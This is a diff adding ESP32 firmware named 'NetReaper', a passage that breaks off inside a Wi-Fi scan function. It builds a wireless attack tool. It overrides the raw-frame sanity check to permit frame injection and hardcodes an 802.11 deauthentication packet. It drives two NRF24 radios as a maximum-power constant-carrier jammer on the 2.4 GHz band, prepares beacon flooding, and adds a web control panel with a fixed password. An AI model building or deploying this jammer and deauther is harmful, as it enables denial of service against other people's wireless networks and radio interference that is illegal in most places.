@@ -1,0 +1,155 @@
+#include <SPI.h>
+#include <RF24.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include "esp_bt.h"
+#include "esp_wifi.h"
+#include "esp_system.h"
+
+// ================= ESP-IDF BYPASS (CRITICAL) =================
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+    return 0;
+}
+// ==============================================================
+
+// ================= PIN CONFIGURATION =================
+const int rfButtonPin = 4;
+const int rfLedPin = 2;
+const int deauthButtonPin = 5;
+const int deauthLedPin = 32;
+
+bool isJamming = false;
+bool isDeauthing = false;
+bool isBeaconing = false;
+bool scanExecuted = false;
+
+bool isWebRfJamming = false;
+unsigned long rfJamStartTime = 0;
+unsigned long currentWebJamDuration = 0;
+
+WebServer server(80);
+const char* apSSID = "NetReaper_Control";
+const char* apPassword = "admin12345";
+String networkListHTML = "";
+String targetSSID = "";
+
+SPIClass *sp = nullptr;
+SPIClass *hp = nullptr;
+
+RF24 radio(27, 15, 16000000); 
+RF24 radio1(22, 21, 16000000); 
+
+int ch = 45;
+int ch1 = 45;
+
+// ================= GLOBAL VARIABLES =================
+struct WiFiNetwork { String ssid; uint8_t bssid[6]; int channel; int rssi; };
+
+const uint8_t deauthPacket[26] = {
+  0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x07, 0x00
+};
+
+int networkCount = 0;
+int targetChannel = 1;
+uint8_t targetBSSID[6];
+WiFiNetwork scannedNetworks[20];
+uint16_t seqNum = 0;
+
+uint8_t beaconPacket[150];
+int currentBeaconChannel = 1;
+
+// ================= FORWARD DECLARATIONS =================
+void stopDeauth();
+void startJamming();
+void stopJamming();
+void checkBeaconButton();
+void sendBeacon(int channel);
+void startBeaconFlood();
+void stopBeaconFlood();
+// ========================================================
+
+// ================= RF JAMMER FUNCTIONS =================
+void startJamming() {
+  Serial.println("\n>>> BT-BAND RF JAMMER ON (MAX POWER)");
+  digitalWrite(rfLedPin, HIGH);
+  
+  // Completely stop Wi-Fi and BT to free the radio for NRF24
+  esp_wifi_stop();
+  btStop();
+  
+  radio.powerUp();
+  radio1.powerUp();
+  radio.startConstCarrier(RF24_PA_MAX, random(80));
+  radio1.startConstCarrier(RF24_PA_MAX, random(80));
+}
+
+// 🔥 FIXED: Robust Wi-Fi Recovery Sequence
+void stopJamming() {
+  Serial.println("\n>>> RF JAMMER OFF");
+  digitalWrite(rfLedPin, LOW);
+  
+  radio.powerDown();
+  radio1.powerDown();
+
+  // 1. Force Wi-Fi completely off to clear any hung states
+  WiFi.mode(WIFI_OFF);
+  
+  // 2. CRITICAL DELAY: Give the ESP32 RF antenna switch time to physically 
+  // disconnect from NRF24 and reconnect to the internal Wi-Fi MAC.
+  delay(500); 
+  
+  // 3. Cleanly restart in AP mode
+  WiFi.mode(WIFI_AP);
+  delay(100);
+  WiFi.softAP(apSSID, apPassword);
+  
+  isWebRfJamming = false;
+  
+  Serial.print("✅ WiFi Re-enabled. Connect to: ");
+  Serial.println(apSSID);
+  Serial.print("IP: ");
+  Serial.println(WiFi.softAPIP());
+}
+
+void toggleJammerPhysical() {
+  isJamming = !isJamming;
+  isWebRfJamming = false;
+  if (isJamming) {
+      if(isDeauthing) stopDeauth();
+      if(isBeaconing) stopBeaconFlood();
+      startJamming();
+  } else {
+      stopJamming();
+  }
+}
+
+void checkJammerButton() {
+  static int lastState = HIGH; static unsigned long lastTime = 0;
+  int currentState = digitalRead(rfButtonPin);
+  if (currentState == LOW && lastState == HIGH && (millis() - lastTime) > 300) {
+    lastTime = millis(); toggleJammerPhysical();
+  }
+  lastState = currentState;
+}
+
+void aggressiveRandomMode() {
+  radio.setChannel(random(80));
+  radio1.setChannel(random(80));
+}
+
+// ================= DEAUTH FUNCTIONS =================
+void startWiFiScan() {
+  Serial.println("[*] Scanning...");
+  WiFi.mode(WIFI_AP_STA); WiFi.disconnect(true); delay(100);
+  networkCount = WiFi.scanNetworks();
+  networkListHTML = "";
+
+  if (networkCount > 0) {
+    for (int i = 0; i < networkCount && i < 20; i++) {
+      scannedNetworks[i].ssid = WiFi.SSID(i);
+      memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
+      scannedNetworks[i].channel = WiFi.channel(i);
+      scannedNetworks[i].rssi = WiFi.RSSI(i);
+      networkListHTML += "<tr><td>[" + String(i) + "]</td><td>" + scannedNetworks[i].ssid + "</td><td>Ch: " + String(scannedNetworks[i].channel) + "</td
